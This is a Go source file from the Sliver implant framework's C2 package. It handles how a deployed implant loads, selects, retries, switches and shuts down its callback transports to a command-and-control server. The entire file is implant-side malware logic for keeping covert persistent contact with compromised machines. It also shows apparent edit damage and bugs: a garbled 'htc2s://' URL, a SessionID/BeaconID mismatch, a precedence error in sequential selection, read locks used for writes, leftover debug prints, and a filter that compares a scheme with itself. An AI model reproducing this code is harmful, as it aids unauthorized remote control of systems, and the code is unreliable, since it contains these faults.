package c2

/*
   Sliver Implant Framework
   Copyright (C) 2019  Bishop Fox

   This program is free software: you can redistribute it and/or modify
   it under the terms of the GNU General Public License as published by
   the Free Software Foundation, either version 3 of the License, or
   (at your option) any later version.

   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.

   You should have received a copy of the GNU General Public License
   along with this program.  If not, see <htc2s://www.gnu.org/licenses/>.
*/

import (
	// {{if .Config.Debug}}
	"log"
	// {{end}}

	"errors"
	"fmt"
	insecureRand "math/rand"
	"net/url"
	"sync"
	"time"

	"github.com/gofrs/uuid"

	"github.com/bishopfox/sliver/protobuf/sliverpb"
)

const (
	StrategyRandom       = "random"
	StrategyRandomDomain = "random-domain"
	StrategySequential   = "sequential"
)

var (
	// ErrMaxAttempts - Passed by transports to the c2 controller
	ErrMaxAttempts = errors.New("reached maximum connection attempts")
)

var (
	// Transports - All active transports on this implant.
	Transports = &c2s{
		Available:       []*C2{},
		transportErrors: make(chan error, 1),
		mutex:           &sync.RWMutex{},
	}
)

// SessionID - A unique ID for the entire lifetime of this
// session as beacon: might need to change this way to proceed.
var SessionID string

func init() {
	id, err := uuid.NewV4()
	if err != nil {
		BeaconID = "00000000-0000-0000-0000-000000000000"
	}
	BeaconID = id.String()
}

// c2s - Holds all active c2s for this implant.
// This is consumed by some handlers & listeners, as well as the routing system.
type c2s struct {
	Available       []*C2         // All transports available (compiled in) to this implant
	Active          *C2           // The transport tied to the C2 server (active connection)
	transportErrors chan error    // When a transport fails, notify the error so we can cycle
	mutex           *sync.RWMutex // Concurrency
	isSwitching     bool          // Notify that we are currently switching the transport.
}

// Init - Parses all available transport strings and registers them as available transports.
// Then starts the first transport in the list, for reaching back to the server.
func (t *c2s) Init() (err error) {

	// Load all available C2 transports
	for order, profile := range profiles {
		c2, err := NewMalleableFromBytes(profile)
		if err != nil {
			// {{if .Config.Debug}}
			log.Printf("Error parsing C2 profiles: %s", err)
			// {{end}}
			continue
		}
		c2.Priority = order
		t.Add(c2)
	}
	if len(t.Available) == 0 {
		return errors.New("no available transports")
	}
	fmt.Println(len(t.Available))

	// {{if .Config.Debug}}
	log.Printf("Starting connection loop ...")
	// {{end}}

	// Find the first C2, and attempt to start it
	// or any subsequent until one is successful.
	err = t.startTransports()
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf(err.Error())
		// {{end}}
		return
	}

	// Start monitoring the transports for any connection errors,
	// and handle them with the appropriate reconnection strategy.
	t.handleTransportErrors()

	return
}

// startTransports - Attempts to start the first transport for this program run,
// and exit the function so that we can start monitoring for errors in another goroutine.
func (t *c2s) startTransports() (err error) {

	// Select the next (first) transport to be started according to the connection strategy
	t.selectNextTransport()

	for {
		// Attempt to start
		err = t.Active.Start(false, "")
		if err != nil {
			// {{if .Config.Debug}}
			log.Printf("Transport failed to start: %s", err)
			// {{end}}

			// Select the next transport to be started
			// according to the connection strategy
			t.Active = t.selectNextTransport()

			// Wait for the specified interval before looping and starting it.
			time.Sleep(time.Duration(t.Active.Profile.ReconnectInterval))
			continue
		}

		// {{if .Config.Debug}}
		log.Printf("Transport started (%s)", t.Active.uri.String())
		// {{end}}
		return
	}

	return errors.New("Failed to start one of the available transports")
}

// handleTransportErrors - Monitor and handle errors
// thrown by transports in the background. Blocking.
func (t *c2s) handleTransportErrors() {

	// Wait for an error to be thrown by a transport
	for err := range t.transportErrors {
		if err == nil {
			// {{if .Config.Debug}}
			log.Printf("(Switching) NIL ERROR ")
			// {{end}}
			continue
		}

		// Do not do anything if we are currently
		// tasked to switch the transport
		if t.isSwitching {
			// {{if .Config.Debug}}
			log.Printf("(Switching) Ignoring error: %s", err)
			// {{end}}
			continue
		}

		// If beacon, errors are constantly being thrown because closing connections
		// will performing blocking reading operations will always return an error.
		// We only care about if not maximum attempts reached
		if t.Active.Profile.Type == sliverpb.C2Type_Beacon && err != ErrMaxAttempts {
			// {{if .Config.Debug}}
			log.Printf("(Beacon) Ignoring error: %s", err)
			// {{end}}
			continue
		}

		// {{if .Config.Debug}}
		log.Printf("Active transport (%s) thrown an error: %s", t.Active.Profile.ID, err)
		// {{end}}

		// Select the next transport according to the specified connection strategy,
		// and make it immediately as the Server transport, so we can cleanup if it fails.
		t.selectNextTransport()

		// Wait for the specified interval before starting it
		time.Sleep(time.Duration(t.Active.Profile.ReconnectInterval))

		// And start it, sending any error back to this routine for cleanup
		err = t.Active.Start(false, "")
		// {{if .Config.Debug}}
		if err != nil {
			log.Printf("Failed to start transport: %s")
		}
		// {{end}}

		// {{if .Config.Debug}}
		log.Printf("Successful transport fallback (%s): %s", t.Active.Profile.ID, t.Active.uri.String())
		// {{end}}
	}
}

// selectNextTransport - Get the next transport
// according to the implant connection strategy.
func (t *c2s) selectNextTransport() (next *C2) {
	switch "{{.Config.ConnectionStrategy}}" {

	// Random C2 with any protocol
	case StrategyRandom:
		next = t.Available[insecureRand.Intn(len(t.Available))]

	// Random C2 with the same protocol
	case StrategyRandomDomain:
		next = t.Available[insecureRand.Intn(len(t.Available))]
		next = t.randomCCDomain(next.uri)

	// Next C2 in order of loading
	case StrategySequential:
		if t.Active == nil {
			next = t.Available[0]
		} else {
			fmt.Println("used sequential")
			fmt.Println(t.Active.Priority % len(t.Available))
			next = t.Available[t.Active.Priority+1%len(t.Available)]
		}
	default:
		if t.Active == nil {
			next = t.Available[0]
		} else {
			fmt.Println(t.Active.Priority % len(t.Available))
			next = t.Available[t.Active.Priority+1%len(t.Available)]
		}
	}

	// Set the transport
	t.mutex.RLock()
	t.Active = next
	t.mutex.RUnlock()

	return
}

// randomCCDomain - Random selection within a protocol
func (t *c2s) randomCCDomain(uri *url.URL) *C2 {
	pool := []*C2{}
	protocol := uri.Scheme
	for _, cc := range t.Available {
		if uri.Scheme == protocol {
			pool = append(pool, cc)
		}
	}
	return pool[insecureRand.Intn(len(pool))]
}

// Add - Add a new active transport to the implant' transport map.
func (t *c2s) Add(c2 *C2) (err error) {
	t.mutex.Lock()
	defer t.mutex.Unlock()

	// If the priority is too high, bring it to last
	if c2.Priority > len(t.Available) {
		c2.Priority = len(t.Available)
		t.Available = append(t.Available, c2)

		// If priority is within the range, insert at requested order
	} else if c2.Priority < len(t.Available) && c2.Priority >= 0 {
		following := append([]*C2{c2}, t.Available[c2.Priority:]...)
		t.Available = append(t.Available[:c2.Priority], following...)

		// If the priority is just the last one, append
	} else if c2.Priority == len(t.Available) {
		t.Available = append(t.Available, c2)
	}

	return
}

// Remove - A transport has terminated its connection, and we remove it.
func (t *c2s) Remove(ID string) (err error) {
	t.mutex.Lock()
	defer t.mutex.Unlock()
	for i, c2 := range t.Available {
		if c2.ID == ID {
			t.Available = append(t.Available[:i], t.Available[i+1:]...)
		}
	}
	// delete(t.Available, ID)
	return
}

// Get - Returns an active C2 given an ID.
func (t *c2s) Get(ID string) (c2 *C2) {
	for _, transport := range t.Available {
		if transport.ID == ID {
			return transport
		}
	}
	return
}

// Switch - Dynamically switch the active transport, if multiple are available.
func (c2 *c2s) SwitchAlt(ID string) (err error) {

	// Get the transport and reset its attempts
	var next = Transports.Get(ID)
	if next == nil {
		return fmt.Errorf("could not find transport with ID %s", ID)
	}
	next.attempts = 0
	next.failures = 0

	c2.mutex.RLock()
	c2.isSwitching = true
	c2.mutex.RUnlock()

	// {{if .Config.Debug}}
	log.Printf("Switching the current transport: %s", c2.Active.ID)
	log.Printf("New transport: %s", next.ID)
	// {{end}}

	// Keep the current transport ID, needed when registering
	// again to the server, for identification purposes.
	oldTransportID := c2.Active.ID

	// Start the transport first.
	// This automatically sends a transport switch registration message
	err = next.Start(true, oldTransportID)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("(Switch) Failed to start new transport: %s", err)
		// {{end}}
		c2.mutex.RLock()
		c2.isSwitching = false
		c2.mutex.RUnlock()

		// Send a transport registration marked failed, with updated stats
		c2.Active.Connection.RequestSend(c2.Active.registerSwitch(oldTransportID, false))
		return err
	}

	// Else if we succeeded, gracefully shutdown the old transport
	err = c2.Active.Stop()
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf(err.Error())
		// {{end}}
	}

	// And assign the new one as current
	c2.mutex.RLock()
	c2.Active = next
	c2.isSwitching = false
	c2.mutex.RUnlock()

	// {{if .Config.Debug}}
	log.Printf("Done switching transport: %s", next.ID)
	// {{end}}

	return nil
}

// Switch - Dynamically switch the active transport, if multiple are available.
func (c2 *c2s) Switch(ID string) (err error) {

	// Get the transport and reset its attempts
	var next = Transports.Get(ID)
	if next == nil {
		return fmt.Errorf("could not find transport with ID %s", ID)
	}
	next.attempts = 0
	next.failures = 0

	c2.mutex.RLock()
	c2.isSwitching = true
	c2.mutex.RUnlock()

	// {{if .Config.Debug}}
	log.Printf("Switching the current transport: %s", c2.Active.ID)
	log.Printf("New transport: %s", next.ID)
	// {{end}}

	// Keep the current transport ID, needed when registering
	// again to the server, for identification purposes.
	oldTransportID := c2.Active.ID

	// Cut the old transport
	err = c2.Active.Stop()
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf(err.Error())
		// {{end}}
	}

	// Start the transport first.
	// This automatically sends a transport switch registration message
	err = next.Start(true, oldTransportID)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf(err.Error())
		// {{end}}
		c2.mutex.RLock()
		c2.isSwitching = false
		c2.mutex.RUnlock()
		return err
	}

	// And assign the new one as current
	c2.mutex.RLock()
	c2.Active = next
	c2.isSwitching = false
	c2.mutex.RUnlock()

	// {{if .Config.Debug}}
	log.Printf("Done switching transport: %s", next.ID)
	// {{end}}

	return nil
}

// SetActiveC2 - Marks the passed C2 as active
func (t *c2s) SetActiveC2(transport *C2) {
	t.mutex.RLock()
	defer t.mutex.RUnlock()
	for _, loaded := range t.Available {
		if loaded.ID == transport.ID {
			loaded.Profile.Active = true
		}
	}
}

// Shutdown - Close all availables transports. If the exit parameter is true
// the transports will close their waiter, which will release the main function
// of this implant program. Normally, this is set true when the kill command
// is received, but not for the "disconnect" command (because we just sleep for this one)
func (t *c2s) Shutdown() (err error) {

	// Close the server transport
	err = t.Active.Stop()

	return
}
